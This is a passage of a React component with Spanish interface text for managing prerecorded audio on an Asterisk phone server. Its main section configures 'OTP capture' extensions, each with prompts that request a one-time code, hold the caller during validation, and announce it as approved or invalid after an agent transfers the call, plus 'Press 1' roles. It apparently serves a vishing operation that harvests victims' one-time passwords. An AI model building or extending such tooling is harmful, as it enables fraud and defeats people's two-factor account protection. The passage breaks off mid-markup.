    hold_music: { label: 'Música de Espera (MOH)', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20' },
    custom: { label: 'Anuncio Personalizado', color: 'text-slate-300 bg-slate-800 border-slate-700' },
  };

  const handlePlayToggle = (audio: AudioPrompt) => {
    if (playingAudioId === audio.id) {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      setPlayingAudioId(null);
    } else {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      const player = new Audio(audio.dataUrl);
      audioPlayerRef.current = player;
      setPlayingAudioId(audio.id);
      player.play().catch((err) => console.error('Audio play error:', err));
      player.onended = () => {
        setPlayingAudioId(null);
      };
    }
  };

  const handlePlayByPath = (asteriskPath: string) => {
    const clean = asteriskPath.replace(/\.wav$/, '');
    const match = audios.find((a) => a.asteriskPath === clean || a.asteriskPath === `custom/${clean.replace(/^custom\//, '')}`);
    if (match) {
      handlePlayToggle(match);
    } else {
      setFeedbackMsg({
        text: `Audio "${asteriskPath}" está configurado en el servidor Asterisk.`,
        type: 'info',
      });
      setTimeout(() => setFeedbackMsg(null), 3500);
    }
  };

  const processFile = (file: File, preselectedCategory?: AudioPrompt['category']) => {
    const reader = new FileReader();
    reader.onload = (e) => {
      const dataUrl = e.target?.result as string;
      setStagedFileDataUrl(dataUrl);
      setStagedFileName(file.name);
      setStagedFileSize(`${(file.size / 1024).toFixed(1)} KB`);

      const tempAudio = new Audio(dataUrl);
      tempAudio.onloadedmetadata = () => {
        const dur = Math.round(tempAudio.duration * 10) / 10 || 5.0;
        setStagedDuration(dur);
      };

      if (!newAudioName) {
        const cleanName = file.name.replace(/\.[^/.]+$/, '').replace(/[_-]/g, ' ');
        setNewAudioName(cleanName.charAt(0).toUpperCase() + cleanName.slice(1));
      }
      if (preselectedCategory) {
        setNewAudioCategory(preselectedCategory);
      }
      setIsUploadModalOpen(true);
    };
    reader.readAsDataURL(file);
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files[0]) {
      processFile(files[0]);
    }
  };

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const files = e.dataTransfer.files;
    if (files && files[0]) {
      processFile(files[0]);
    }
  };

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioChunksRef.current = [];
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onload = (e) => {
          const dataUrl = e.target?.result as string;
          const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
          const fileName = `grabacion_mic_${timestamp}.wav`;
          setStagedFileDataUrl(dataUrl);
          setStagedFileName(fileName);
          setStagedFileSize(`${(audioBlob.size / 1024).toFixed(1)} KB`);
          setStagedDuration(recordingTime);
          setNewAudioName(`Locución en vivo (${recordingTime}s)`);
          setIsUploadModalOpen(true);
        };
        reader.readAsDataURL(audioBlob);

        stream.getTracks().forEach((track) => track.stop());
      };

      mediaRecorder.start();
      setIsRecording(true);
      setRecordingTime(0);

      recordingTimerRef.current = setInterval(() => {
        setRecordingTime((prev) => prev + 1);
      }, 1000);
    } catch (err) {
      alert('No se pudo acceder al micrófono para grabar. Verifica los permisos.');
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecording) {
      mediaRecorderRef.current.stop();
      setIsRecording(false);
      if (recordingTimerRef.current) {
        clearInterval(recordingTimerRef.current);
      }
    }
  };

  const handleSaveAudio = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!stagedFileDataUrl) return;

    const baseName = stagedFileName
      .replace(/\.[^/.]+$/, '')
      .toLowerCase()
      .replace(/[^a-z0-9_]/g, '_');

    const cleanPath = `custom/${baseName}`;

    const newAudio: AudioPrompt = {
      id: `audio-${Date.now()}`,
      name: newAudioName || stagedFileName,
      category: newAudioCategory,
      fileName: `${baseName}.wav`,
      fileSize: stagedFileSize,
      durationSec: stagedDuration,
      format: 'WAV',
      sampleRate: '8000Hz PCM 16-bit Mono',
      dataUrl: stagedFileDataUrl,
      asteriskPath: cleanPath,
      createdAt: new Date().toISOString(),
    };

    onAddAudio(newAudio);

    // Save to backend filesystem
    try {
      const res = await fetch('/api/asterisk/audio/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          dataUrl: stagedFileDataUrl,
          fileName: `${baseName}.wav`,
          category: newAudioCategory,
        }),
      });
      const data = await res.json();
      if (data.success) {
        console.log('[AUDIO SAVED TO DISK]', data);
      }
    } catch (err) {
      console.warn('Backend audio save error:', err);
    }

    // Auto-activate as live audio in Asterisk if requested
    if (autoActivateRole && newAudioCategory !== 'custom' && newAudioCategory !== 'hold_music') {
      handleAssignRoleDirect(newAudioCategory as AudioRole, cleanPath);
    }

    setIsUploadModalOpen(false);
    setStagedFileDataUrl(null);
    setStagedFileName('');
    setNewAudioName('');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setFeedbackMsg({
      text: `Comando copiado al portapapeles: "${text}"`,
      type: 'info',
    });
    setTimeout(() => setFeedbackMsg(null), 3000);
  };

  const filteredRoles = SYSTEM_ROLES.filter((r) => {
    if (filterCategory === 'all') return true;
    return r.category === filterCategory;
  });

  return (
    <div className="space-y-6">
      {/* Header and overview */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
            <Volume2 className="w-6 h-6 text-emerald-400" />
            <span>Gestor de Mensajes Pregrabados del Sistema</span>
            <span className="text-xs px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-mono">
              {audios.length} audios
            </span>
          </h2>
          <p className="text-sm text-slate-400">
            Controla y cambia los audios pregrabados en tiempo real desde la web. Cada cambio se aplica inmediatamente en <strong>Asterisk AstDB</strong> sin necesidad de reiniciar la central.
          </p>
        </div>

        <div className="flex items-center gap-2 flex-wrap">
          <button
            onClick={fetchActiveAssignments}
            className="inline-flex items-center space-x-1.5 px-3 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-colors"
            title="Recargar estado actual de audios desde Asterisk AstDB"
          >
            <RefreshCw className="w-3.5 h-3.5 text-slate-400" />
            <span>Actualizar Estado</span>
          </button>

          {isRecording ? (
            <button
              onClick={stopRecording}
              className="inline-flex items-center space-x-2 px-4 py-2 rounded-lg text-sm font-semibold bg-rose-600 hover:bg-rose-500 text-white shadow-md animate-pulse"
            >
              <Square className="w-4 h-4" />
              <span>Detener Grabación ({recordingTime}s)</span>
            </button>
          ) : (
            <button
              onClick={startRecording}
              className="inline-flex items-center space-x-1.5 px-3.5 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
              title="Grabar locución directamente desde el micrófono"
            >
              <Mic className="w-4 h-4 text-rose-400" />
              <span>Grabar Micrófono</span>
            </button>
          )}

          <button
            onClick={() => fileInputRef.current?.click()}
            className="inline-flex items-center space-x-2 px-4 py-2 rounded-lg text-sm font-semibold bg-emerald-500 hover:bg-emerald-400 text-black shadow-md shadow-emerald-500/20 font-bold"
          >
            <UploadCloud className="w-4 h-4" />
            <span>Subir Audio Pregrabado</span>
          </button>
          <input
            type="file"
            ref={fileInputRef}
            onChange={handleFileInputChange}
            accept="audio/*,.wav,.mp3,.ogg,.gsm"
            className="hidden"
          />
        </div>
      </div>

      {/* Floating feedback message */}
      {feedbackMsg && (
        <div
          className={`p-3 rounded-xl border flex items-center justify-between gap-3 text-xs transition-all ${
            feedbackMsg.type === 'success'
              ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
              : 'bg-blue-500/10 border-blue-500/30 text-blue-300'
          }`}
        >
          <div className="flex items-center gap-2">
            <CheckCircle className="w-4 h-4 shrink-0" />
            <span>{feedbackMsg.text}</span>
          </div>
          <button
            onClick={() => setFeedbackMsg(null)}
            className="text-slate-400 hover:text-white font-mono"
          >
            &times;
          </button>
        </div>
      )}

      {/* SECTION 1: DIVISIÓN INDIVIDUAL DE AUDIOS PARA EXTENSIONES DE CAPTURA OTP */}
      <div className="space-y-6">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 bg-slate-900/90 p-4 rounded-2xl border border-slate-800 shadow-lg">
          <div className="flex items-start gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500/20 to-purple-500/20 border border-indigo-500/40 flex items-center justify-center text-indigo-300 shrink-0 shadow-inner">
              <Layers className="w-5 h-5 text-indigo-400" />
            </div>
            <div>
              <div className="flex items-center gap-2 flex-wrap">
                <h3 className="text-base font-bold text-white">
                  División Individual de Audios para Extensiones de Captura OTP
                </h3>
                <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                  Sin cruces ni confusiones
                </span>
              </div>
              <p className="text-xs text-slate-400 mt-1 max-w-3xl">
                Cada extensión (<strong className="text-purple-300">7777 / 777</strong>, <strong className="text-cyan-300">6666 / 666</strong>, <strong className="text-amber-300">5555 / 555</strong>, <strong className="text-emerald-300">4444 / 444</strong> y <strong className="text-pink-300">3333 / 333</strong>) está completamente aislada en Asterisk AstDB con sus 4 audios individuales: <span className="text-slate-200">1. Solicitud OTP</span>, <span className="text-slate-200">2. Espera de Validación</span>, <span className="text-slate-200">3. Aprobado</span> y <span className="text-slate-200">4. Inválido</span>.
              </p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2 self-start lg:self-auto shrink-0">
            <button
              onClick={handleSaveOtpExtensions}
              disabled={isSavingOtpExtensions}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg active:scale-95 cursor-pointer ${
                otpExtensionsSaved || (isExtLocked('7777') && isExtLocked('6666') && isExtLocked('5555') && isExtLocked('4444') && isExtLocked('3333'))
                  ? 'bg-emerald-500 hover:bg-emerald-400 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
                  : 'bg-gradient-to-r from-purple-600 via-indigo-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-indigo-600/30'
              }`}
              title="Guardar y blindar todas las extensiones OTP contra sobreescritura automática"
            >
              {isSavingOtpExtensions ? (
                <RefreshCw className="w-4 h-4 animate-spin" />
              ) : otpExtensionsSaved || (isExtLocked('7777') && isExtLocked('6666')) ? (
                <ShieldCheck className="w-4 h-4" />
              ) : (
                <Save className="w-4 h-4" />
              )}
              <span>
                {isSavingOtpExtensions
                  ? 'Blindando todas en AstDB...'
                  : otpExtensionsSaved
                  ? '¡Todas las Exts. Blindadas!'
                  : 'Guardar y Blindar Todas las Exts. OTP'}
              </span>
            </button>
          </div>
        </div>

        {/* Barra selectora de vistas: Ver Todas o seleccionar extensión individual */}
        <div className="flex items-center justify-between gap-3 bg-slate-950/70 p-2 rounded-xl border border-slate-800/80 overflow-x-auto">
          <div className="flex items-center gap-1.5 text-xs">
            <span className="text-slate-400 font-semibold px-2 hidden sm:inline">Filtrar Extensión:</span>
            <button
              onClick={() => setFeaturedExtTab('all')}
              className={`px-3 py-1.5 rounded-lg transition-all font-bold flex items-center gap-1.5 cursor-pointer ${
                featuredExtTab === 'all'
                  ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/30'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Layers className="w-3.5 h-3.5" />
              <span>Ver Todas (5)</span>
            </button>

            {OTP_EXTENSIONS_CONFIG.map((extInfo) => {
              const active = featuredExtTab === extInfo.extension;
              const locked = isExtLocked(extInfo.extension);
              return (
                <button
                  key={extInfo.id}
                  onClick={() => setFeaturedExtTab(extInfo.extension as any)}
                  className={`px-3 py-1.5 rounded-lg transition-all font-bold flex items-center gap-1.5 cursor-pointer ${
                    active
                      ? `${extInfo.badgeColor} shadow-md`
                      : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
                  }`}
                >
                  <span>Ext. {extInfo.extension}</span>
                  <span className="text-[10px] opacity-80 font-normal">({extInfo.shortExt})</span>
                  {locked && <Lock className="w-3 h-3 text-amber-400" />}
                </button>
              );
            })}
          </div>

          <div className="text-[11px] text-slate-400 hidden xl:flex items-center gap-1.5 px-2">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
            <span>Marcación Asterisk aislada por variable de canal</span>
          </div>
        </div>

        {/* PANELES DE EXTENSIONES OTP (7777, 6666, 5555, 4444, 3333) */}
        {OTP_EXTENSIONS_CONFIG.filter(
          (extInfo) => featuredExtTab === 'all' || featuredExtTab === extInfo.extension
        ).map((extInfo) => {
          const locked = isExtLocked(extInfo.extension);
          const isSaving = isSavingExt[extInfo.extension];

          return (
            <div
              key={extInfo.id}
              className={`p-6 rounded-2xl bg-gradient-to-br ${extInfo.bgGradient} border-2 ${extInfo.borderColor} shadow-2xl space-y-5 transition-all`}
            >
              {/* Encabezado de la Extensión */}
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-slate-700/50">
                <div className="flex items-start gap-3.5">
                  <div
                    className={`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 shadow-inner border ${extInfo.accentBg}`}
                  >
                    <Headphones className="w-6 h-6" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2 flex-wrap">
                      <h4 className="text-lg font-extrabold text-white">
                        Extensión {extInfo.extension} <span className="text-sm font-normal text-slate-300">/ Marcación Corta: {extInfo.shortExt}</span>
                      </h4>
                      <span className={`px-2.5 py-0.5 rounded-full text-xs font-bold ${extInfo.badgeColor} shadow-sm`}>
                        {extInfo.badge}
                      </span>
                      {locked ? (
                        <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40">
                          <Lock className="w-3 h-3 text-amber-400" />
                          <span>Blindado e Inmutable</span>
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-medium bg-slate-800 text-slate-300 border border-slate-700">
                          <Unlock className="w-3 h-3 text-slate-400" />
                          <span>Desbloqueado</span>
                        </span>
                      )}
                    </div>
                    <p className="text-xs text-slate-300 mt-1">
                      {extInfo.purpose}
                    </p>
                  </div>
                </div>

                {/* Botones de Blindaje y Desbloqueo individuales */}
                <div className="flex items-center gap-2 shrink-0">
                  <button
                    type="button"
                    onClick={() => handleSaveConfigExtension(extInfo.extension)}
                    disabled={isSaving}
                    className="px-3.5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white text-xs font-bold flex items-center gap-1.5 shadow-lg shadow-emerald-600/30 transition-all cursor-pointer disabled:opacity-50"
                    title={`Guardar y fijar permanentemente los 4 audios de la extensión ${extInfo.extension} en AstDB`}
                  >
                    {isSaving ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Save className="w-3.5 h-3.5" />}
                    <span>{isSaving ? 'Guardando en AstDB...' : `Guardar y Blindar Ext. ${extInfo.extension}`}</span>
                  </button>

                  {locked && (
                    <button
                      type="button"
                      onClick={() => handleUnlockExtension(extInfo.extension)}
                      className="px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 active:scale-95 text-amber-300 hover:text-white border border-amber-500/30 text-xs font-semibold flex items-center gap-1.5 transition-all cursor-pointer"
                      title="Desbloquear para permitir ajustes automáticos"
                    >
                      <Unlock className="w-3.5 h-3.5" />
                      <span>Desbloquear</span>
                    </button>
                  )}
                </div>
              </div>

              {/* Mensaje de aislamiento garantizado */}
              <div className="flex items-center justify-between gap-2 p-2.5 rounded-xl bg-slate-950/70 border border-slate-800 text-xs">
                <div className="flex items-center gap-2 text-slate-300">
                  <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span>
                    <strong>Canal Exclusivo Ext. {extInfo.extension}:</strong> Los 4 audios asignados aquí solo se reproducen cuando el agente transfiere a la extensión <span className="font-mono text-white font-bold">{extInfo.extension}</span> o <span className="font-mono text-white font-bold">{extInfo.shortExt}</span>. No hay cruces de audios con otras extensiones.
                  </span>
                </div>
                <span className="font-mono text-[10px] text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800 shrink-0 hidden md:inline">
                  AstDB ivr_vars/{extInfo.extension}_*
                </span>
              </div>

              {/* LOS 4 AUDIOS INDIVIDUALES DE ESTA EXTENSIÓN */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {EXTENSION_SLOTS.map((slotMeta) => {
                  const SlotIcon = slotMeta.icon;
                  const slotKey = slotMeta.roleKey(extInfo.extension);
                  const currentPath = activeAssignments[slotKey] || slotMeta.fallbackDefault;
                  const isSyncing = !!isSyncingRole[slotKey];
                  const isUploading = !!uploadingSlot[slotKey];
                  const matchedAudio = audios.find((a) => a.asteriskPath === currentPath.replace(/\.wav$/, ''));
                  const isPlaying = matchedAudio && playingAudioId === matchedAudio.id;

                  return (
                    <div
                      key={slotMeta.slot}
                      className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 hover:border-slate-700 transition-all flex flex-col justify-between space-y-3.5 shadow-md"
                    >
                      {/* Cabecera del Slot */}
                      <div className="space-y-1">
                        <div className="flex items-center justify-between gap-2">
                          <div className="flex items-center gap-2">
                            <span className="px-2 py-0.5 rounded-md text-[10px] font-extrabold uppercase tracking-wider bg-slate-800 text-slate-200 border border-slate-700">
                              {slotMeta.badge}
                            </span>
                            <span className="font-mono text-[11px] text-indigo-300 font-semibold">
                              AstDB: {slotMeta.astDbKey(extInfo.extension)}
                            </span>
                          </div>
                          {locked && (
                            <span className="flex items-center gap-1 text-[10px] text-amber-400 font-medium">
                              <Lock className="w-2.5 h-2.5" />
                              <span>Fijado</span>
                            </span>
                          )}
                        </div>

                        <div className="flex items-center gap-2 pt-1">
                          <SlotIcon className="w-4 h-4 text-slate-300 shrink-0" />
                          <h5 className="text-sm font-bold text-white">
                            {slotMeta.title}
                          </h5>
                        </div>
                        <p className="text-[11px] text-slate-400 leading-tight">
                          {slotMeta.description}
                        </p>
                      </div>

                      {/* Selector de Audio y Reproductor */}
                      <div className="space-y-2">
                        <div className="flex items-center justify-between text-[11px] text-slate-400">
                          <span>Audio asignado en Asterisk:</span>
                          <span className="font-mono text-white font-bold bg-slate-900 px-2 py-0.5 rounded border border-slate-800 truncate max-w-[220px]">
                            {currentPath}
                          </span>
                        </div>

                        <div className="flex items-center gap-1.5">
                          <select
                            value={currentPath}
                            disabled={isSyncing}
                            onChange={(e) => handleAssignRoleDirect(slotKey as any, e.target.value)}
                            className={`flex-1 px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-100 text-xs font-mono focus:outline-none ${extInfo.ringColor}`}
                          >
                            {audios.map((a) => (
                              <option key={a.id} value={a.asteriskPath}>
                                {a.name} ({a.asteriskPath})
                              </option>
                            ))}
                          </select>

                          <button
                            type="button"
                            onClick={() => handlePlayByPath(currentPath)}
                            className="px-2.5 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold flex items-center gap-1 shadow-md shadow-indigo-600/20 cursor-pointer"
                            title="Escuchar audio configurado en este slot"
                          >
                            {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                            <span className="hidden sm:inline">{isPlaying ? 'Pausa' : 'Oír'}</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => triggerFilePicker(extInfo.extension, slotMeta.slot)}
                            disabled={isUploading}
                            className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center gap-1 border border-slate-700 cursor-pointer disabled:opacity-50"
                            title="Subir archivo de audio propio para este slot"
                          >
                            {isUploading ? (
                              <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
                            ) : (
                              <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                            )}
                            <span className="hidden sm:inline">{isUploading ? 'Subiendo...' : 'Subir'}</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleDeactivateRole(slotKey as any)}
                            disabled={isSyncing}
                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs cursor-pointer"
                            title="Restaurar audio predeterminado para este slot"
                          >
                            <PowerOff className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>

                      {/* Mini zona de arrastrar y soltar para este slot */}
                      <div
                        onDragOver={(e) => e.preventDefault()}
                        onDrop={(e) => {
                          e.preventDefault();
                          if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                            handleUploadForExtensionSlot(extInfo.extension, slotMeta.slot, e.dataTransfer.files[0]);
                          }
                        }}
                        onClick={() => triggerFilePicker(extInfo.extension, slotMeta.slot)}
                        className="py-1.5 px-3 rounded-lg border border-dashed border-slate-800 hover:border-slate-600 bg-slate-900/50 hover:bg-slate-900 text-center cursor-pointer transition-all flex items-center justify-center gap-2 text-[10px] text-slate-400 hover:text-slate-300"
                      >
                        <UploadCloud className="w-3 h-3 text-slate-400" />
                        <span>Arrastra un audio WAV aquí o clic para subir directamente a este paso</span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          );
        })}
      </div>

      {/* SECTION 2: MATRIZ DE ASIGNACIÓN EN VIVO (CAMBIAR AUDIOS EN 1 CLIC) */}
      <div className="p-5 rounded-xl bg-slate-900 border border-slate-800 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
              <Sliders className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-white">
                Centro de Control de Mensajes Pregrabados (En Vivo en Asterisk)
              </h3>
              <p className="text-xs text-slate-400">
                Selecciona cualquier audio de tu biblioteca para cambiar al instante lo que Asterisk reproduce en cada etapa de la llamada.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-1.5 self-start sm:self-auto bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
            <button
              onClick={() => setFilterCategory('all')}
              className={`px-2.5 py-1 rounded transition-colors ${
                filterCategory === 'all'
                  ? 'bg-emerald-500 text-black font-bold'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              Todos ({SYSTEM_ROLES.length})
            </button>
            <button
              onClick={() => setFilterCategory('otp')}
              className={`px-2.5 py-1 rounded transition-colors ${
                filterCategory === 'otp'
                  ? 'bg-purple-500 text-white font-bold'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              Exts OTP (9)
            </button>
            <button
              onClick={() => setFilterCategory('press1')}
              className={`px-2.5 py-1 rounded transition-colors ${
                filterCategory === 'press1'
                  ? 'bg-emerald-500 text-black font-bold'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              Press 1 (3)
            </button>
          </div>
        </div>

        {/* Roles Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filteredRoles.map((roleConf) => {
            const Icon = roleConf.icon;
            const currentAudioPath = activeAssignments[roleConf.role] || roleConf.fallbackDefault;
            const isSyncing = !!isSyncingRole[roleConf.role];
            const matchedAudio = audios.find((a) => a.asteriskPath === currentAudioPath.replace(/\.wav$/, ''));
            const isPlayingCurrent = matchedAudio && playingAudioId === matchedAudio.id;

            return (
              <div
                key={roleConf.role}
                className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
                  roleConf.role === 'welcome_7777'
                    ? 'bg-gradient-to-br from-purple-950/30 to-slate-950 border-purple-500/40 shadow-md'
                    : roleConf.role === 'welcome_6666'
                    ? 'bg-gradient-to-br from-cyan-950/30 to-slate-950 border-cyan-500/40 shadow-md'
                    : 'bg-slate-950/70 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div>
                  <div className="flex items-start justify-between gap-2 mb-2">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-md bg-slate-800 flex items-center justify-center text-slate-300">
                        <Icon className="w-4 h-4 text-emerald-400" />
                      </div>
                      <div>
                        <h4 className="font-semibold text-white text-xs leading-snug">
                          {roleConf.title}
                        </h4>
                      </div>
                    </div>
                    <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full border shrink-0 ${roleConf.badgeColor}`}>
                      {roleConf.badge}
                    </span>
                  </div>

                  <p className="text-[11px] text-slate-400 leading-relaxed">
                    {roleConf.description}
                  </p>
                </div>

                {/* Current assignment & Selector */}
                <div className="space-y-2 pt-2 border-t border-slate-800/80">
                  <div className="flex items-center justify-between text-[11px]">
                    <span className="text-slate-400 font-medium">Audio actual en central:</span>
                    <span className="font-mono text-emerald-400 font-bold truncate max-w-[190px]">
                      {currentAudioPath}
                    </span>
                  </div>

                  <div className="flex items-center gap-2">
                    <select
                      value={currentAudioPath}
                      disabled={isSyncing}
                      onChange={(e) => handleAssignRoleDirect(roleConf.role, e.target.value)}
                      className="flex-1 px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-200 text-xs font-mono focus:border-emerald-500 focus:outline-none"
                    >
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>

                    <button
                      onClick={() => handlePlayByPath(currentAudioPath)}
                      className={`p-2 rounded-lg transition-colors shrink-0 ${
                        isPlayingCurrent
                          ? 'bg-emerald-500 text-black shadow-md shadow-emerald-500/20 animate-pulse'
                          : 'bg-slate-800 hover:bg-slate-700 text-slate-200'
                      }`}
                      title="Escuchar audio actualmente asignado"
                    >
                      {isPlayingCurrent ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                    </button>

                    <button
                      onClick={() => handleDeactivateRole(roleConf.role)}
                      disabled={isSyncing}
                      className="p-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-transparent hover:border-rose-500/30 transition-colors shrink-0"
                      title={`Desactivar audio personalizado y restaurar por defecto (${roleConf.fallbackDefault})`}
                    >
                      <PowerOff className="w-3.5 h-3.5" />
                    </button>

                    <button
                      onClick={() => {
                        setNewAudioCategory(roleConf.role as AudioPrompt['category']);
                        setNewAudioName(roleConf.title);
                        fileInputRef.current?.click();
                      }}
                      className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors shrink-0"
                      title={`Subir un nuevo audio directamente para: ${roleConf.title}`}
                    >
                      <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                    </button>
                  </div>

                  {/* AstDB sync status & manual command copy */}
                  <div className="flex items-center justify-between text-[10px] text-slate-400 font-mono bg-slate-900/80 px-2 py-1 rounded">
                    <span className="truncate">AstDB: {roleConf.astDbKey} = "{currentAudioPath}"</span>
                    <button
                      onClick={() =>
                        copyToClipboard(`asterisk -rx 'database put ${roleConf.astDbKey} "${currentAudioPath}"'`)
                      }
                      className="text-slate-400 hover:text-emerald-400 p-0.5 ml-1 shrink-0"
                      title="Copiar comando CLI de Asterisk"
                    >
                      <Copy className="w-3 h-3" />
                    </button>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Drag & Drop Upload Zone (Guideline compliant: supports both drag-and-drop and click) */}
      <div
        onDragOver={(e) => {
          e.preventDefault();
          setIsDragging(true);
        }}
        onDragLeave={() => setIsDragging(false)}
        onDrop={handleFileDrop}
        onClick={() => fileInputRef.current?.click()}
        className={`border-2 border-dashed rounded-xl p-6 text-center cursor-pointer transition-all ${
          isDragging
            ? 'border-emerald-500 bg-emerald-500/10 scale-[1.01]'
            : 'border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700'
        }`}
      >
        <div className="flex flex-col items-center justify-center space-y-2 max-w-md mx-auto">
          <div className="w-12 h-12 rounded-xl bg-slate-800 flex items-center justify-center text-emerald-400 border border-slate-700">
            <UploadCloud className="w-6 h-6" />
          </div>
          <div className="text-sm font-medium text-white">
            Arrastra y suelta tu archivo de audio aquí o <span className="text-emerald-400 underline">haz clic para explorar</span>
          </div>
          <p className="text-xs text-slate-400 leading-relaxed">
            Formatos compatibles: <strong>WAV (16-bit 8000Hz PCM recomendado)</strong>, MP3, OGG, GSM. Asterisk reproducirá el archivo con máxima nitidez sin transcodificación.
          </p>
        </div>
      </div>

      {/* Section Title: Audioteca de Archivos */}
      <div className="flex items-center justify-between pt-2">
        <h3 className="text-base font-bold text-white flex items-center gap-2">
          <span>Biblioteca de Locuciones Disponibles</span>
          <span className="text-xs text-slate-400 font-normal">({audios.length} archivos en servidor)</span>
        </h3>
        <p className="text-xs text-slate-400 hidden sm:block">
          Usa los botones rápidos de cada tarjeta para asignar el audio a cualquier mensaje del sistema en 1 clic.
        </p>
      </div>

      {/* Audio Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {audios.map((audio) => {
          const isPlaying = playingAudioId === audio.id;
          const cat = categoryLabels[audio.category] || categoryLabels.custom;

          // Check which roles this audio is currently assigned to
          const assignedRoles = Object.entries(activeAssignments)
            .filter(([_, path]) => path === audio.asteriskPath || path === `custom/${audio.fileName.replace(/\.wav$/, '')}`)
            .map(([role]) => role as AudioRole);

          return (
            <div
              key={audio.id}
              className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
